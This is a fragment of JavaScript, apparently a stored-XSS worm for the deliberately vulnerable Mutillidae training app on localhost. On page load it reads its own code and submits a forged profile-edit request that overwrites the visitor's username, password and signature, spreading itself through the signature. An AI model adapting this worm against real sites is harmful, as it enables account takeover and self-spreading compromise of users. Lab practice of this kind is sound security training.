...
window.onload=function(){
	...
	//Get worm code by ID
	var wormCode=encodeURIComponent(document.getElementById("worm").innerHTML);	
    ...
    var edit_profile =  "csrf-token=&username=".concat(username).concat("&password=").concat(password).concat("&confirm_password=").concat(password).concat("&my_signature=").concat(signature).concat("&edit-account-profile-php-submit-button=Update+Profile");

	//Send profile edit request
    var sendProfileEditReq = "http://127.0.0.1/mutillidae/index.php?page=edit-account-profile.php";
    Ajax=new XMLHttpRequest();
	Ajax.open("POST",sendProfileEditReq,true);
	Ajax.setRequestHeader("Host","127.0.0.1");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send(edit_profile);
